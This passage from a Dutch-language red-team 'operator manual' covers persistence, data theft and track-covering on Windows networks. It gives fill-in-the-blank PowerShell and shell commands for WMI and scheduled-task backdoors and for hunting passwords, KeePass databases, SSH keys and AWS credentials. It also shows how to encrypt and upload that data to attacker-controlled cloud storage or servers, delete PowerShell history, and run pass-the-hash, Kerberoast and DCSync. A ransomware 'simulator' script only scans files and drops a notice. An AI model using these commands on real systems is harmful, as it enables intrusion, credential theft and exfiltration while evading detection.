- `[TASK_NAME]` → Naam voor de task (kies iets legitiems)
- `[PATH_TO_IMPLANT]` → Pad naar implant

**Voorbeeld:**
```powershell
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\update.exe" /sc onlogon /ru SYSTEM
```

---

### WMI Event Subscription

```powershell
# Filter - wanneer triggeren
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "[FILTER_NAME]"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Consumer - wat uitvoeren
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "[CONSUMER_NAME]"
    CommandLineTemplate = "[PATH_TO_IMPLANT]"
}

# Binding - koppel filter aan consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**Wat doet dit?**
Zeer persistente backdoor via WMI. Overleeft reboots en is moeilijk te detecteren.

**Aanpassen:**
- `[FILTER_NAME]` → Naam voor filter
- `[CONSUMER_NAME]` → Naam voor consumer
- `[PATH_TO_IMPLANT]` → Pad naar implant

**Voorbeeld:**
```powershell
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemHealthCheck"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemHealthConsumer"
    CommandLineTemplate = "C:\Windows\Temp\health.exe"
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

---

# FASE 5: DATA EXFILTRATION

## 5.1 DATA DISCOVERY

### Vind Gevoelige Bestanden

```powershell
Get-ChildItem -Path C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf,*.txt,*.config -ErrorAction SilentlyContinue | 
    Select-String -Pattern "password|wachtwoord|credential|secret|api.key" -List |
    Select-Object Path
```

**Wat doet dit?**
Zoekt door alle user folders naar bestanden die wachtwoorden of secrets kunnen bevatten.

**Geen aanpassingen nodig.**

---

### Vind KeePass Databases

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue
```

**Wat doet dit?**
Vindt KeePass password databases. Jackpot als je deze kunt exfiltreren!

---

### Vind SSH Keys

```powershell
Get-ChildItem -Path C:\Users -Recurse -Include id_rsa,id_ed25519,*.pem,*.ppk -ErrorAction SilentlyContinue
```

**Wat doet dit?**
Vindt SSH private keys die toegang kunnen geven tot servers.

---

### Vind AWS Credentials

```powershell
Get-ChildItem -Path C:\Users -Recurse -Include credentials,config -ErrorAction SilentlyContinue | 
    Where-Object { $_.DirectoryName -like "*\.aws*" }
```

**Wat doet dit?**
Vindt AWS credential bestanden. Geeft toegang tot cloud resources!

---

## 5.2 EXFILTRATION

### Compress & Encrypt Data

```powershell
# Maak staging folder
mkdir C:\Windows\Temp\stage

# Compress
Compress-Archive -Path [SOURCE_PATH] -DestinationPath C:\Windows\Temp\stage\data.zip

# Encrypt met 7zip
7z a -p"[PASSWORD]" -mhe=on C:\Windows\Temp\stage\encrypted.7z C:\Windows\Temp\stage\data.zip
```

**Aanpassen:**
- `[SOURCE_PATH]` → Pad naar data om te exfiltreren
- `[PASSWORD]` → Sterk wachtwoord voor encryptie

**Voorbeeld:**
```powershell
Compress-Archive -Path C:\SensitiveData -DestinationPath C:\Windows\Temp\stage\data.zip
7z a -p"Xp0s3S3cur1ty2024!" -mhe=on C:\Windows\Temp\stage\encrypted.7z C:\Windows\Temp\stage\data.zip
```

---

### Upload naar Cloud Storage

```powershell
# AWS S3
aws s3 cp C:\Windows\Temp\stage\encrypted.7z s3://[BUCKET]/[PATH]/

# MEGA.nz
megacmd login [EMAIL] [PASSWORD]
megacmd put C:\Windows\Temp\stage\encrypted.7z /[FOLDER]/

# Rclone (any cloud)
rclone copy C:\Windows\Temp\stage\ [REMOTE]:[PATH]/
```

**Aanpassen:**
- `[BUCKET]` → Je S3 bucket
- `[PATH]` → Pad in bucket
- `[EMAIL]` → MEGA email
- `[PASSWORD]` → MEGA wachtwoord
- `[FOLDER]` → MEGA folder
- `[REMOTE]` → Rclone remote naam

---

### HTTPS Upload

```bash
curl -X POST -F "file=@[FILE_PATH]" https://[YOUR_SERVER]/upload
```

**Aanpassen:**
- `[FILE_PATH]` → Pad naar bestand
- `[YOUR_SERVER]` → Je exfil server

---

# FASE 6: RANSOMWARE SIMULATION

## ⚠️ ALLEEN SIMULATIE - GEEN ECHTE ENCRYPTIE ⚠️

### Ransomware Simulator Script

```python
#!/usr/bin/env python3
"""
XPOSE SECURITY - RANSOMWARE SIMULATOR
======================================
SIMULEERT ALLEEN - ENCRYPTEERT NIETS
Documenteert wat zou worden getroffen
"""

import os
import json
from datetime import datetime

# ============================================================
# 🔧 AANPASSEN:
# ============================================================

TARGET_PATH = "C:\\Users"              # Pad om te scannen
OUTPUT_FILE = "ransomware_simulation.json"  # Output rapport

# ============================================================

# Extensies die echte ransomware target
TARGET_EXTENSIONS = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.sql', '.mdb', '.sqlite', '.db',
    '.vmdk', '.vmx', '.vhdx', '.vdi',
    '.bak', '.backup', '.zip', '.rar'
]

# Directories om te skippen
SKIP_DIRS = ['Windows', 'Program Files', 'Program Files (x86)', '$Recycle.Bin']


def scan_targets(target_path):
    """Scan voor bestanden die ransomware zou encrypteren."""
    
    results = {
        'scan_time': datetime.now().isoformat(),
        'target_path': target_path,
        'files': [],
        'total_files': 0,
        'total_size_bytes': 0,
        'high_value_targets': []
    }
    
    print(f"[*] Scanning {target_path}...")
    
    for root, dirs, files in os.walk(target_path):
        # Skip system directories
        dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
        
        for file in files:
            ext = os.path.splitext(file)[1].lower()
            
            if ext in TARGET_EXTENSIONS:
                filepath = os.path.join(root, file)
                
                try:
                    size = os.path.getsize(filepath)
                    
                    results['files'].append({
                        'path': filepath,
                        'extension': ext,
                        'size_bytes': size
                    })
                    
                    results['total_files'] += 1
                    results['total_size_bytes'] += size
                    
                    # Flag high-value targets
                    if ext in ['.vmdk', '.vhdx', '.sql', '.bak']:
                        results['high_value_targets'].append(filepath)
                        
                except (PermissionError, OSError):
                    pass
    
    return results


def create_ransom_note(results, output_path="XPOSE_SIMULATION.txt"):
    """Maak simulatie ransom note."""
    
    size_gb = results['total_size_bytes'] / (1024**3)
    
    note = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                     XPOSE SECURITY - RED TEAM ASSESSMENT                     ║
║                                                                              ║
║                    *** THIS IS A SIMULATION ***                              ║
║                    *** NO FILES WERE ENCRYPTED ***                           ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  IMPACT ASSESSMENT:                                                          ║
║                                                                              ║
║  Total files at risk:     {results['total_files']:,} files                           ║
║  Total data at risk:      {size_gb:.2f} GB                                         ║
║  High-value targets:      {len(results['high_value_targets'])} files                 ║
║                                                                              ║
║  If this were real ransomware:                                               ║
║  - All identified files would be encrypted with AES-256                      ║
║  - Decryption key held by attacker                                           ║
║  - Recovery without payment would be impossible                              ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  Contact: XPOSE SECURITY for remediation guidance                            ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
    
    with open(output_path, 'w') as f:
        f.write(note)
    
    print(f"[+] Ransom note created: {output_path}")
    
    return note


def main():
    # Scan voor targets
    results = scan_targets(TARGET_PATH)
    
    # Print samenvatting
    print(f"\n{'='*60}")
    print("RANSOMWARE SIMULATION RESULTS")
    print('='*60)
    print(f"Files at risk: {results['total_files']:,}")
    print(f"Data at risk: {results['total_size_bytes'] / (1024**3):.2f} GB")
    print(f"High-value targets: {len(results['high_value_targets'])}")
    
    # Save full report
    with open(OUTPUT_FILE, 'w') as f:
        json.dump(results, f, indent=2)
    print(f"\nFull report: {OUTPUT_FILE}")
    
    # Create ransom note
    create_ransom_note(results)
    
    # Also drop to desktop
    desktop = os.path.expanduser("~\\Desktop")
    if os.path.exists(desktop):
        create_ransom_note(results, os.path.join(desktop, "XPOSE_SIMULATION.txt"))


if __name__ == "__main__":
    main()
```

**Aanpassen:**
- `TARGET_PATH` → Pad om te scannen (bijv. `C:\Users` of `D:\Data`)
- `OUTPUT_FILE` → Naam voor het JSON rapport

---

# FASE 7: CLEANUP

### Verwijder Tools

```powershell
Remove-Item -Path C:\Windows\Temp\*.exe -Force -ErrorAction SilentlyContinue
Remove-Item -Path C:\Users\Public\*.exe -Force -ErrorAction SilentlyContinue
Remove-Item -Path [IMPLANT_PATHS] -Force -ErrorAction SilentlyContinue
```

**Aanpassen:**
- `[IMPLANT_PATHS]` → Paden waar je implants hebt geplaatst

---

### Verwijder Registry Persistence

```powershell
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v [NAME] /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v [NAME] /f
```

**Aanpassen:**
- `[NAME]` → De naam die je gebruikte bij het aanmaken

---

### Verwijder Scheduled Tasks

```powershell
schtasks /delete /tn "[TASK_NAME]" /f
```

**Aanpassen:**
- `[TASK_NAME]` → De task naam die je gebruikte

---

### Verwijder WMI Persistence

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
    Where-Object {$_.Name -eq "[FILTER_NAME]"} | Remove-WmiObject

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | 
    Where-Object {$_.Name -eq "[CONSUMER_NAME]"} | Remove-WmiObject

Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | 
    Remove-WmiObject
```

**Aanpassen:**
- `[FILTER_NAME]` → Filter naam die je gebruikte
- `[CONSUMER_NAME]` → Consumer naam die je gebruikte

---

### Clear PowerShell History

```powershell
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History
```

---

# QUICK REFERENCE

## Common Ports

```
22    SSH                 1433  MSSQL
25    SMTP                1521  Oracle
53    DNS                 3306  MySQL
80    HTTP                3389  RDP
88    Kerberos            5432  PostgreSQL
135   RPC                 5985  WinRM HTTP
139   NetBIOS             5986  WinRM HTTPS
389   LDAP                8080  HTTP Proxy
443   HTTPS               8443  HTTPS Alt
445   SMB                 8545  Ethereum
636   LDAPS               9878  FIX Protocol
```

## Hashcat Modes

```
-m 1000   NTLM
-m 5600   NetNTLMv2  
-m 13100  Kerberoast (TGS-REP)
-m 18200  AS-REP Roast
```

## Quick One-Liners

```bash
# Domain Admins opvragen
net group "Domain Admins" /domain

# Kerberoast
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Pass-the-hash met psexec
psexec.py [DOMAIN]/[USER]@[IP] -hashes :[HASH]

# DCSync alle hashes
secretsdump.py [DOMAIN]/[USER]:[PASS]@[DC_IP]
```

---

**XPOSE SECURITY**
*Nation-State Red Team Operator Manual v3.0*

VERTROUWELIJK — Januari 2026
